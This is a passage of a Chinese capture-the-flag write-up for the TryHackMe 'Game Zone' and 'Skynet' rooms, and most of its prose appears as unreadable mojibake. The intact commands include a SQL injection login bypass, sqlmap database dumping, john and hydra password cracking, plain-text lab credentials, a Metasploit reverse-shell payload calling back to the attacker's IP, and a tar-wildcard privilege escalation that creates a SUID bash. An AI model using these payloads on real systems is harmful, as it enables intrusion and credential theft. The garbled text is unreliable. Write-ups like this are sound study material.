æ­¤éœ€è¦åˆ°eventsï¼Œçœ‹ä¸€ä¸‹è¯¥æœåŠ¡çš„è¿è¡Œæ—¥å¿—å‘ç°äº†å…¶è¿è¡Œexeï¼Œä¹‹åå°±æ˜ç¡®äº†ã€‚ 0x07 Game ZoneæŒ‘æˆ˜ æœ¬ä¼šè®®å®¤å°†ä»‹ç» SQLiï¼ˆæ‰‹åŠ¨å’Œé€šè¿‡ SQLMap åˆ©ç”¨æ­¤æ¼æ´ï¼‰ã€ç ´è§£ç”¨æˆ·å“ˆå¸Œå¯†ç ã€ä½¿ç”¨ SSH éš§é“æ­ç¤ºéšè—æœåŠ¡ä»¥åŠä½¿ç”¨ metasploit æœ‰æ•ˆè´Ÿè½½è·å¾— root æƒé™ã€‚ è¿™é‡Œåå‘å›¾ç‰‡è¯†åˆ«ï¼Œå‘ç°è¯¥å›¾ç‰‡çš„äººç‰©åå­—ä¸ºagent 47 é€šè¿‡SQLiè·å–è®¿é—®æƒé™ åœ¨æœ¬å°èŠ‚ä¸­ï¼Œä½ å°†æ›´å¤šåœ°äº†è§£ SQLï¼ˆç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼‰ä»¥åŠå¦‚ä½•æ½œåœ¨åœ°æ“çºµæŸ¥è¯¢è¯­å¥ä»¥ä¾¿ä¸æ•°æ®åº“è¿›è¡Œé€šä¿¡ã€‚ SQL æ˜¯ä¸€ç§æ ‡å‡†è¯­è¨€ï¼Œç”¨äºåœ¨æ•°æ®åº“ä¸­å­˜å‚¨ã€ç¼–è¾‘å’Œæ£€ç´¢æ•°æ®ã€‚ SQLæŸ¥è¯¢è¯­å¥å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š SELECT FROM users WHERE username = â€˜usernameâ€™ AND password = â€˜passwordâ€™ åœ¨ç›®æ ‡é¶æœºåå°ï¼Œå½“ä½ å°è¯•ç™»å½•ç›®æ ‡ç«™ç‚¹æ—¶ï¼Œå®ƒä¼šä»ç™»å½•é¡µçš„ç”¨æˆ·åè¾“å…¥æ¡†å’Œå¯†ç è¾“å…¥æ¡†ä¸­è·å–ä½ æ‰€è¾“å…¥çš„å€¼ï¼Œç„¶åå°†è¿™äº›å€¼ç›´æ¥æ’å…¥åˆ°ä¸Šé¢çš„æŸ¥è¯¢è¯­å¥ä¸­ã€‚ å¦‚æœè¯¥æŸ¥è¯¢è¯­å¥æ‰¾åˆ°æœ‰æ•ˆæ•°æ®å¾—ä»¥åŒ¹é…ï¼Œä½ å°†è¢«å…è®¸ç™»å½•ç›®æ ‡ç«™ç‚¹ï¼Œå¦åˆ™å°†åœ¨ç™»å½•é¡µé¢ä¸Šæ˜¾ç¤ºä¸€æ¡é”™è¯¯æ¶ˆæ¯æç¤ºã€‚ è¿™æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æ¼æ´ä½ç½®ï¼ˆç™»å½•æ¡†ï¼‰ï¼Œå› ä¸ºä½ å¯ä»¥è¾“å…¥ä½ æ‰€æ„é€ çš„ç”¨æˆ·åâ€“å°†ç”¨æˆ·åæ„é€ ä¸ºSQL æŸ¥è¯¢è¯­å¥ï¼Œè¿™å°†å†™å…¥ã€æ‹¼æ¥å¹¶æ‰§è¡ŒæŸ¥è¯¢æ“ä½œã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åœ¨ä¸Šé¢å­¦åˆ°çš„çŸ¥è¯†ï¼Œåœ¨æ²¡æœ‰ä»»ä½•åˆæ³•å‡­æ®çš„æƒ…å†µä¸‹æ“çºµæŸ¥è¯¢è¯­å¥å¹¶å®ç°ç™»å½•è¡Œä¸ºã€‚å¦‚æœæˆ‘ä»¬è¾“å…¥ç”¨æˆ·å adminï¼Œè¾“å…¥å¯†ç ' or 1=1 # å®ƒä¼šå°†å¯†ç ä¸­çš„å€¼æ’å…¥åˆ°åç«¯æŸ¥è¯¢è¯­å¥ä¸­å¹¶éªŒè¯æˆ‘ä»¬çš„ä¼šè¯æ˜¯å¦æœ‰æ•ˆã€‚ ç°åœ¨åœ¨ Web æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„å…·ä½“ SQL æŸ¥è¯¢å¦‚ä¸‹ï¼š SELECT * FROM users WHERE username = â€˜adminâ€™ AND password =â€™ â€™ or 1=1 # â€™ æˆ‘ä»¬ä½œä¸ºå¯†ç è¾“å…¥çš„é¢å¤–SQLè¯­å¥ï¼ˆ' or 1=1 #ï¼‰å°†ä¼šæ›´æ”¹ç›®æ ‡åç«¯çš„åˆå§‹æŸ¥è¯¢ä¸ºä¸Šè¿°è¯­å¥ï¼Œè¿™å°†ä¸­æ–­åˆå§‹æŸ¥è¯¢è¿‡ç¨‹å¹¶åœ¨ 1==1 æ—¶ç»§ç»­ï¼ˆæ­¤æ—¶æ˜¯ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½ï¼‰ï¼Œç„¶åæˆ‘ä»¬å°†æ³¨é‡Šè¯¥æŸ¥è¯¢çš„åæ¥éƒ¨åˆ†ï¼ˆä½¿ç”¨**â€“**ç¬¦å·è¿›è¡Œæ³¨é‡Šï¼‰ä»¥é˜»æ­¢SQLæŸ¥è¯¢ä¸­æ–­ã€‚ å³ä½¿ç›®æ ‡é¶æœºçš„æ•°æ®åº“ä¸­æ²¡æœ‰ç®¡ç†å‘˜ç”¨æˆ·ï¼Œä½ ä»ç„¶å¯ä»¥ä½¿ç”¨æˆ‘ä»¬åœ¨ä¸Šé¢æ‰€æåˆ°çš„å€¼ï¼ˆ' or 1=1 #ï¼‰åœ¨ä¸çŸ¥é“ä»»ä½•å‡­æ®çš„æƒ…å†µä¸‹å®Œæˆç™»å½•ã€‚åœ¨ç™»å½•é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨' or 1=1 #ä½œä¸ºç™»å½•çš„ç”¨æˆ·åå¹¶å°†å¯†ç æ¡†ä¸€æ ç›´æ¥ç•™ç©ºã€‚ è¿™é‡Œæˆ‘åœ¨ç”¨æˆ·åçš„åœ°æ–¹è¾“å…¥â€™ or 1=1 #ï¼ŒæˆåŠŸè·³è½¬ ä½¿ç”¨SQLmap SQLMap æ˜¯ä¸€ç§æµè¡Œçš„å¼€æºè‡ªåŠ¨ SQL æ³¨å…¥å’Œæ•°æ®åº“æ¥ç®¡å·¥å…·ï¼Œå®ƒé¢„è£…åœ¨æ‰€æœ‰ç‰ˆæœ¬çš„ Kali Linux ä¸Šï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨ä¸‹è½½å’Œå®‰è£…SQLMapå·¥å…·ã€‚ åœ¨webå®‰å…¨é¢†åŸŸæœ‰è®¸å¤šä¸åŒç±»å‹çš„ SQL æ³¨å…¥ï¼ˆæ¯”å¦‚åŸºäºå¸ƒå°”çš„æ³¨å…¥ã€åŸºäºæ—¶é—´çš„æ³¨å…¥ç­‰ï¼‰ï¼Œè€ŒSQLMap å·¥å…·å°†å°è¯•ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯è‡ªåŠ¨åŒ–æ•´ä¸ªæ³¨å…¥è¿‡ç¨‹ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨ SQLMap é’ˆå¯¹ç›®æ ‡é¶æœºè½¬å‚¨å®ƒçš„æ•´ä¸ªæ•°æ®åº“â€“ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰ç™»å½•çš„é¡µé¢ï¼Œæˆ‘ä»¬å°† SQLMap æŒ‡å‘ç›®æ ‡ç«™ç‚¹çš„è¯„è®ºæœç´¢åŠŸèƒ½ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ BurpSuite æ‹¦æˆªå¯¹ç›®æ ‡ç«™ç‚¹çš„æœç´¢åŠŸèƒ½çš„è¯·æ±‚ã€‚ æ¥ç€å°†ä¸Šè¿°å†…å®¹cvåˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œç„¶åæˆ‘ä»¬å†å°†å…¶ä¼ é€’ç»™ SQLMapå·¥å…· ä»¥ä½¿ç”¨æˆ‘ä»¬å·²ç»ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¼šè¯ã€‚ sqlmap -r request.txt --dbms=mysql --dump -r è¯»å–ä¹‹å‰å·²ä¿å­˜çš„burpsuiteæ‰€æ‹¦æˆªçš„è¯·æ±‚ä¿¡æ¯ â€“dbms å‘Šè¯‰ SQLMap ç›®æ ‡æ˜¯ä»€ä¹ˆç±»å‹çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ â€“dump å°è¯•è½¬å‚¨æ•´ä¸ªæ•°æ®åº“æ•°æ®ï¼ˆçœŸå®ç¯å¢ƒä¸‹è¯·è°¨æ…ä½¿ç”¨dumpå‚æ•°ï¼‰ è¾“å…¥ä»¥ä¸Šå‘½ä»¤ä¹‹åï¼Œå°†åœ¨ç»ˆç«¯å¯åŠ¨SQLMap å¹¶å°è¯•ä½¿ç”¨ä¸åŒçš„æ³¨å…¥æ–¹æ³•ä»¥éªŒè¯ä¸€äº›æ˜“å—æ”»å‡»çš„æ¼æ´ï¼Œæœ€ç»ˆï¼Œå®ƒå°†ä¼šè¾“å‡ºç›®æ ‡æ•°æ®åº“ä¸­çš„æ•°æ®ä¿¡æ¯åˆ°ç»ˆç«¯ç•Œé¢ã€‚ POST /portal.php HTTP/1.1 Host: 10.10.63.45 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 15 Origin: http://10.10.63.45 Connection: close Referer: http://10.10.63.45/portal.php Cookie: PHPSESSID=2ggt1pm0albmt14khadge49ne0 Upgrade-Insecure-Requests: 1 searchitem=test è¿™é‡Œè¿˜æ˜¯é‡æ¢äº†ä¸€ä¸ªé¶æœºï¼Œåˆšå¼€å§‹çš„æ‰«ä¸å‡ºæ¥æ¼æ´ã€‚ã€‚ã€‚è¿™é‡Œå‘ç°å¯†ç å¯ä»¥ç›´æ¥çˆ†ç ´å‡ºæ¥ ä½¿ç”¨ JohnTheRipper ç ´è§£å¯†ç  æˆ‘ä»¬éœ€è¦å­¦ä¼šä½¿ç”¨å·¥å…·æ¥è£…13 å¼€è†›æ‰‹çº¦ç¿° (JTR) æ˜¯ä¸€ç§å¿«é€Ÿã€å…è´¹ä¸”å¼€æºçš„å¯†ç ç ´è§£ç¨‹åºï¼Œè¿™ä¸ªå·¥å…·é¢„è£…åœ¨æ‰€æœ‰ Kali Linux æœºå™¨ä¸Šã€‚æˆ‘ä»¬å°†ä½¿ç”¨JTRç¨‹åºæ¥ç ´è§£æˆ‘ä»¬ä¹‹å‰è·å¾—çš„å“ˆå¸Œå¯†ç å€¼ï¼Œ JohnTheRipper å·²æœ‰ 15 å¹´å†å²ï¼Œå½“ç„¶è¿˜æœ‰ä¸€äº›å…¶ä»–å¯†ç ç ´è§£ç¨‹åºä¾‹å¦‚ HashCatç­‰ã€‚ JohnTheRipperç¨‹åºçš„å·¥ä½œåŸç†æ˜¯å…ˆè·å–ä¸€ä¸ªå¯†ç å•è¯è¡¨ï¼Œç„¶åç”¨æŒ‡å®šçš„hashç®—æ³•å¯¹å…¶è¿›è¡Œæ•£åˆ—å¤„ç†ï¼Œå†å°†å…¶ä¸ç›®æ ‡æ•£åˆ—å¯†ç ï¼ˆhashå¯†ç å€¼ï¼‰è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸¤ä¸ªæ•£åˆ—å¯†ç ç›¸åŒï¼Œåˆ™è¡¨ç¤ºå·²æ‰¾åˆ°ç›®æ ‡æ•£åˆ—å¯†ç æ‰€å¯¹åº”çš„æ˜æ–‡å¯†ç â€“å³ç ´è§£æˆåŠŸã€‚å› ä¸ºæˆ‘ä»¬ä¸èƒ½ç›´æ¥åè½¬ç›®æ ‡æ•£åˆ—å€¼æ¥å¾—åˆ°æ˜æ–‡å¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡æ¯”è¾ƒæ•£åˆ—å€¼æ¥å®Œæˆå¯¹ç›®æ ‡hashå€¼çš„çŒœè§£è¿‡ç¨‹ã€‚ åœ¨æœ¬åœ°æ”»å‡»æœºä¸Šå®‰è£… JohnTheRipper åï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‚æ•°é’ˆå¯¹ç›®æ ‡å“ˆå¸Œè¿›è¡Œç ´è§£ï¼š john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-SHA256 â€“wordlist - æ˜¯ä½ ç”¨æ¥ç ´è§£ç›®æ ‡å“ˆå¸Œå€¼çš„å¯†ç å•è¯åˆ—è¡¨ hash.txt - åŒ…å«ç›®æ ‡å“ˆå¸Œå€¼çš„åˆ—è¡¨ï¼ˆåœ¨ä¸€èˆ¬æƒ…å†µä¸‹å®ƒçš„å†…å®¹åªæ˜¯ 1 ä¸ªå“ˆå¸Œå€¼ï¼‰ â€“format - æŒ‡æ˜å°†è¦ä½¿ç”¨çš„æ•£åˆ—ç®—æ³•ç±»å‹ï¼Œåœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œå®ƒè¡¨ç¤ºä½¿ç”¨ SHA256 ç®—æ³•è¿›è¡Œå“ˆå¸Œå¤„ç†ã€‚ ssh agent47@10.10.63.45 ä½¿ç”¨åå‘ SSH éš§é“æš´éœ²ç›®æ ‡éšè—æœåŠ¡ åå‘ SSH ç«¯å£è½¬å‘èƒ½å¤Ÿ æŒ‡å®šå°†è¿œç¨‹æœåŠ¡å™¨ä¸»æœºä¸Šçš„ç»™å®šç«¯å£è½¬å‘åˆ°æœ¬åœ°ç«¯çš„ç»™å®šä¸»æœºå’Œç«¯å£ã€‚ -L æ˜¯æœ¬åœ°éš§é“ (YOU &lt;-- CLIENT ç”±è¿œç¨‹å®¢æˆ·ç«¯åˆ°ä½ çš„æœ¬åœ°æœº)ã€‚ å¦‚æœæŸä¸ªç«™ç‚¹è¢«é˜»æ­¢ï¼Œä½ å¯ä»¥å°†æµé‡è½¬å‘åˆ°ä½ æ‰€æ‹¥æœ‰çš„æœåŠ¡å™¨ä¸Šå¹¶æŸ¥çœ‹å®ƒã€‚ ä¾‹å¦‚ï¼Œå¦‚æœç«™ç‚¹imguråœ¨å·¥ä½œä¸­è¢«é˜»æ­¢ï¼Œä½ å¯ä»¥æ‰§è¡Œ ssh -L 9000:imgur.com:80 user@example.comï¼Œç„¶ååœ¨ä½ çš„æœ¬åœ°æœºå™¨ä¸Šè®¿é—® localhost:9000ï¼Œè¿™å°†ä½¿ç”¨ä½ æ‰€æ‹¥æœ‰çš„å…¶ä»–æœåŠ¡å™¨åŠ è½½ç«™ç‚¹imgurçš„æµé‡ã€‚ -R æ˜¯è¿œç¨‹éš§é“ï¼ˆYOU --&gt; CLIENT ç”±ä½ çš„æœ¬åœ°æœºåˆ°è¿œç¨‹å®¢æˆ·ç«¯ï¼‰ã€‚ è¿™æ„å‘³ç€ä½ å°†æµé‡è½¬å‘åˆ°å¦ä¸€å°æœåŠ¡å™¨ä»¥ä¾›å…¶ä»–äººæŸ¥çœ‹ï¼Œè¯¥è¿‡ç¨‹ä¸ä¸Šé¢çš„æœ¬åœ°éš§é“ç¤ºä¾‹ç±»ä¼¼ï¼Œä½†åŠ è½½æµé‡çš„ç»“æœç›¸åã€‚ æˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªåä¸º ss çš„å·¥å…·æ¥è°ƒæŸ¥ä¸»æœºä¸Šæ‰€è¿è¡Œçš„å¥—æ¥å­—ï¼ˆsocket ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è¿è¡Œå‘½ä»¤ ss -tulpn å®ƒå°†å‘Šè¯‰æˆ‘ä»¬ä¸»æœºä¸Šæ­£åœ¨è¿è¡Œå“ªäº›å¥—æ¥å­—ï¼ˆsocket ï¼‰è¿æ¥ã€‚ æ¥ç€æˆ‘ä»¬è®¿é—®æœ¬åœ°10000ç«¯å£å³å¯ è¿™é‡Œåˆ©ç”¨agent47ç”¨æˆ·å¯†ç ç™»å½•å³å¯æŸ¥çœ‹ æå‡æƒé™åˆ°root æ ¹æ®CMSç‰ˆæœ¬ï¼Œä½¿ç”¨ Metasploit æœç´¢èƒ½å¤Ÿé’ˆå¯¹ç›®æ ‡æœºå™¨æ‰§è¡Œçš„æœ‰æ•ˆè´Ÿè½½ å³payloadã€‚ å¯åŠ¨msfï¼Œæœç´¢å¯ç”¨æ¨¡å—ã€‚ è®¾ç½®å‚æ•°å¹¶æ‰§è¡Œpayloadã€‚ set PAYLOAD payload/cmd/unix/reverse options set USERNAME agent47 set PASSWORD videogamer124 set RHOSTS 127.0.0.1 set LHOST 10.13.16.58 #æ”»å‡»æœºæ‰€ä½¿ç”¨çš„è¿æ¥è‡³TryHackMeå¹³å°çš„å†…éƒ¨vpn ipåœ°å€ set SSL false exploit /root/root.txtä¸‹ æ€»ç»“ é’ˆå¯¹webç«™ç‚¹çš„ç™»å½•æ¡†åŠŸèƒ½ï¼Œé‡‡ç”¨äº†sqlæ³¨å…¥çš„ä¸‡èƒ½å¯†ç ï¼Œä¹Ÿæ˜¯æˆåŠŸè¿›å…¥ï¼Œä¹‹åé’ˆå¯¹å…¶ä¸­çš„æ•°æ®æŸ¥è¯¢åŠŸèƒ½ï¼Œé‡‡ç”¨SQLmapåˆ¤æ–­å…¶ä¸­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ï¼ˆpostæ³¨å…¥ï¼‰ï¼Œæœ€ådumpå‡ºäº†ç”¨æˆ·åå’Œå¯†ç ï¼Œé‡‡ç”¨johnå·¥å…·è§£å¯†å‡ºäº†å¯†ç ï¼Œç„¶åsshè¿œç¨‹ç™»å½•ã€‚ éšåss -tulpnçœ‹åˆ°å½“å‰tcpå¥—å­—è¿æ¥æƒ…å†µï¼Œéšåçœ‹åˆ°10000ç«¯å£ä¸å‡ºç½‘ï¼Œå°è¯•sshæœ¬åœ°ç«¯å£è½¬å‘ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ä»æœ¬åœ°è®¿é—®è¯¥ç«¯å£ï¼ŒæˆåŠŸè®¿é—®ä¹‹åï¼Œé‡‡ç”¨ç”¨æˆ·åå¯†ç ç™»å½•è¿›å»ï¼Œå‘ç°å­˜åœ¨webmin cmsæ¼æ´ï¼Œæ¥ç€å°±æ˜¯å¸¸è§„msf exploitçš„åˆ©ç”¨ã€‚ 0x08 SkynetæŒ‘æˆ˜ nmap -T5 -sC -sV -p- 10.10.187.5 è¿™é‡Œçœ‹åˆ°139ä¸445ç«¯å£çš„å¼€æ”¾ï¼Œå°è¯•æšä¸¾ä¸€ä¸‹smbçœ‹ä¸€ä¸‹å…±äº«çš„æ–‡ä»¶æœ‰å“ªäº›ï¼ˆè¿™é‡Œæ— å¯†ç å³å¯ï¼‰ smbclient -L \\\\10.10.187.5 çœ‹åˆ°åŒ¿åç”¨æˆ·anonymousæ–‡ä»¶å¤¹ï¼Œç»§ç»­è®¿é—®çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨ä»€ä¹ˆ smbclient //10.10.187.5/anonymous ä¹‹åè¿›å…¥logsæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œå‘ç°log2.txtå«æœ‰ç›¸å…³å¯†ç ä¿¡æ¯ cyborg007haloterminator terminator22596 terminator219 terminator20 terminator1989 terminator1988 terminator168 terminator16 terminator143 terminator13 terminator123!@# terminator1056 terminator101 terminator10 terminator02 terminator00 roboterminator pongterminator manasturcaluterminator exterminator95 exterminator200 dterminator djxterminator dexterminator determinator cyborg007haloterminator avsterminator alonsoterminator Walterminator 79terminator6 1996terminator è¿™é‡Œæ²¡æ€è·¯äº†ï¼Œçœ‹äº†wpæ˜¯å»æ‰¾webç«™ç‚¹çš„å¯ç–‘ç‚¹äº†ï¼Œgobusteræ‰«ç›®å½•ï¼Œå‘ç°squirrelmailå¯ç–‘ç›®å½• è¿™é‡Œæ˜¯ä¸ªé‚®ä»¶ç™»å½•ç³»ç»Ÿï¼Œå¯ä»¥è”æƒ³åˆ°ä¹‹å‰çš„é‚®ä»¶ç”¨æˆ·åï¼Œä½¿ç”¨hydraçˆ†ç ´ä¸€ä¸‹çœ‹çœ‹ hydra -l milesdyson -P log1.txt 10.10.187.5 http-form-post \"/squirrelmail/src/redirect.php:login_username=milesdyson&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password incorrect\" æˆåŠŸå¾—åˆ°å¯†ç milesdyson:cyborg007haloterminator ç™»å½•è¿›å»ä¹‹åçœ‹åˆ°äº†smbå¯†ç é‡ç½®ï¼Œé‡Œé¢æ˜¯å½“å‰smbæœåŠ¡å¯†ç ï¼š )s{A&amp;2Z=F^n_E.B` è¿™é‡Œè”æƒ³åˆ°ç™»å½•å‰é¢çš„smbå…±äº«è´¦æˆ·milesdyson å¯ä»¥æ‰¾åˆ°è¯¥è´¦æˆ·noteså¤‡å¿˜å½•ä¸­çš„ä¿¡æ¯ï¼Œå‘ç°è¿™é‡Œæ·»åŠ äº†ä¸ªCMSï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹ å°è¯•åœ¨äºŒçº§ç›®å½•ä¸‹ç»§ç»­æ‰«ææ•æ„Ÿç›®å½• dirsearch -u \"http://10.10.187.5/45kra24zxs28v3yd/\" è®¿é—®å¾—åˆ°Cuppa CMS æ¼æ´åº“æ‰¾åˆ°CMSæ¼æ´ï¼Œ å‘ç°å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œé‚£ç›´æ¥åŒ…å«æˆ‘ä»¬æ„é€ çš„æ¶æ„shellæ–‡ä»¶ï¼ˆåœ¨æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨ä¸Šï¼‰ å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸæ‹¿åˆ°shellï¼Œè¿™ä»¥åå¾—ææƒå°±ä¸æ˜¯å¸¸è§„æ€è·¯äº†ï¼Œæˆ‘æƒ³åˆ°äº†suidï¼Œä½†æ˜¯æ²¡åŠæ³•åˆ©ç”¨ï¼Œç»“æœwpå…ˆæ˜¯æäº†ä¸€ä¸ªç¨³å®šshellï¼Œçœ‹çš„è®¡åˆ’ä»»åŠ¡ï¼Œä½†å°±ç®—æˆ‘çœ‹åˆ°è®¡åˆ’ä»»åŠ¡ï¼Œä¹Ÿä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨ï¼ˆè™½ç„¶æƒ³åˆ°ä¿®æ”¹ï¼Œä½†æ˜¯åœ¨é‚£ä¸ªshellä¸‹æ— æ³•æ­£å¸¸ä½¿ç”¨vimï¼‰ Taré€šé…ç¬¦æ¼æ´ææƒ which python #éªŒè¯ç›®æ ‡æœºæœ‰æ— Pythonç¯å¢ƒ python -c \"import pty ; pty.spawn('/bin/bash')\" #åˆ©ç”¨Pythonç¯å¢ƒå°†å½“å‰shellåˆ‡æ¢ä¸ºä¸€ä¸ªæ›´ç¨³å®šçš„shell è¿™é‡Œçœ‹åˆ°backup.shå­˜åœ¨è®¡åˆ’ä»»åŠ¡ï¼Œæˆ‘ä»¬çœ‹å…¶ä¸­å†™çš„ä»€ä¹ˆ -rwxr-xr-x 1 root root 74 Sep 17 2019 backup.sh ç”±ä¸Šå›¾å¯çŸ¥ä»¥ä¸‹ä¿¡æ¯ï¼š backupsç›®å½•ä¸‹æœ‰ä¸€ä¸ªbackup.shæ–‡ä»¶ï¼Œå…¶å†…å®¹å’Œä½œç”¨æ˜¯â€“åˆ‡æ¢ç›®å½•è‡³/var/www/html å¹¶å°†è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹å½’æ¡£ä¸ºbackup.tgzå‹ç¼©æ–‡ä»¶ï¼Œè¯¥tgzæ–‡ä»¶ä¿å­˜åœ¨backupsç›®å½•ä¸‹ï¼› é€šè¿‡æŸ¥çœ‹/etc/crontabå³å®šæ—¶ä»»åŠ¡å¯çŸ¥â€“åˆšæ‰æè¿°çš„backupsç›®å½•ä¸‹çš„backup.shæ–‡ä»¶æ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œè¯¥.shè„šæœ¬æ¯åˆ†é’Ÿéƒ½ä¼šä»¥rootèº«ä»½æ‰§è¡Œã€‚ åœ¨æŸ¥è¯¢ GTFOBins ç½‘ç«™åï¼Œæˆ‘ä»¬å‘ç°é€šè¿‡tarå‘½ä»¤å¯ä»¥åˆ©ç”¨ä¸€ä¸ªåä¸ºâ€“checkpointçš„å‚æ•°ï¼Œè¯¥å‚æ•°å…è®¸åœ¨æ¯æ¬¡å½’æ¡£ X ä¸ªæ–‡ä»¶æ—¶ï¼ˆXçš„é»˜è®¤å€¼ä¸º10ï¼‰æ˜¾ç¤ºâ€œè¿›åº¦â€æ¶ˆæ¯ï¼Œ â€“checkpointè¿˜å¯ä»¥ä¸ â€“checkpoint-action æ ‡å¿—ä¸²è”ä½¿ç”¨ï¼Œâ€“checkpoint-actionæ ‡å¿—å…è®¸åœ¨åˆ°è¾¾æ£€æŸ¥ç‚¹ï¼ˆcheckpointï¼‰æ—¶ä»¥äºŒè¿›åˆ¶æˆ–è„šæœ¬çš„å½¢å¼æ‰§è¡ŒæŸäº›æ“ä½œã€‚ ç»“åˆå‰è¿°å·²çŸ¥ä¿¡æ¯ï¼šç”±äºbackupsç›®å½•ä¸‹çš„backup.shè„šæœ¬ä¸­ä½¿ç”¨çš„é€šé…ç¬¦* å°†å¯¹ /var/www/html ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰§è¡Œå½’æ¡£å‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨/var/www/htmlä¸‹æ·»åŠ  â€“checkpoint=1 æ–‡ä»¶ï¼ˆå¯ç”¨æ£€æŸ¥ç‚¹åŠŸèƒ½ï¼‰å’Œ â€“checkpoint-action=exec=xxx æ–‡ä»¶ï¼ˆæŒ‡å®šè¦æ‰§è¡Œçš„æ“ä½œï¼Œæ£€æŸ¥ç‚¹å€¼ä¸º1ï¼Œæ¯å½’æ¡£ä¸€ä¸ªæ–‡ä»¶éƒ½æ‰§è¡ŒæŒ‡å®šæ“ä½œï¼‰ï¼Œé‚£ä¹ˆå½“ tar å¤„ç†åˆ°ä»¥ä¸Šæ–‡ä»¶æ—¶ï¼Œç›¸å…³çš„æ–‡ä»¶åå°†ä¼šè¢«æœ‰æ•ˆåœ°è§†ä¸ºtarå‘½ä»¤çš„å‚æ•°â€“ä»è€Œæ‰§è¡ŒæŸäº›æ“ä½œã€‚ åœ¨/var/www/htmlç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªBASHè„šæœ¬ï¼Œè¯¥è„šæœ¬çš„æ‰§è¡Œç»“æœå°†åˆ›å»ºä¸€ä¸ªå®è´¨ä¸ºbashå‰¯æœ¬çš„ SUID äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†è¯¥è„šæœ¬å‘½åä¸ºnewroot.shï¼š echo \"cp /bin/bash /tmp/nroot &amp;&amp; chmod +s /tmp/nroot\" &gt; newroot.sh ç»§ç»­åœ¨/var/www/htmlç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤åˆ›å»ºä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶çš„å®é™…ä½œç”¨æ˜¯ä»¥æ–‡ä»¶åä½œä¸º tar å‘½ä»¤è¡Œä¸­çš„å‚æ•°: touch \"/var/www/html/--checkpoint=1\" touch \"/var/www/html/--checkpoint-action=exec=sh newroot.sh\" å¤§çº¦ä¸€åˆ†é’Ÿåï¼Œcron è®¡åˆ’ä½œä¸šï¼ˆå³backupsç›®å½•ä¸‹çš„backup.shè„šæœ¬ï¼‰å°†ä¼šä»¥rootæƒé™è‡ªåŠ¨è¿è¡Œï¼Œä»è€Œèƒ½å¤ŸæˆåŠŸåˆ›å»ºä¸€ä¸ªSUIDæ–‡ä»¶ï¼ˆ/tmp/nrootï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ -p æ ‡å¿—æ‰§è¡Œè¯¥SUIDæ–‡ä»¶ï¼Œè¿™å°†å…è®¸ä»¥è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…èº«ä»½ï¼ˆrootï¼‰æ‰§è¡Œæ­¤äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿›è€Œå¯ä»¥æ ¹æ®æ­¤äºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹åˆ‡æ¢åˆ°root shellã€‚ æœ€åå¾—åˆ°root flag æ€»ç»“ ä¾æ—§å¸¸è§„nmapæ‰«æï¼Œå‘ç°110çš„pop3é‚®ä»¶æœåŠ¡åè®®ä»¥åŠSMBçš„139å’Œ445ç«¯å£çš„å¼€æ”¾ï¼Œäºæ˜¯å°è¯•æšä¸¾SMBæœåŠ¡ï¼Œå‘ç°å­˜åœ¨åŒ¿åç”¨æˆ·å’Œmileç”¨æˆ·ä¸¤ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼Œå…ˆè®¿é—®åŒ¿åçš„çœ‹æ˜¯å¦å­˜åœ¨æ•æ„Ÿä¿¡æ¯ç»“æœå‘ç°äº†ä¸€äº›å¯†ç 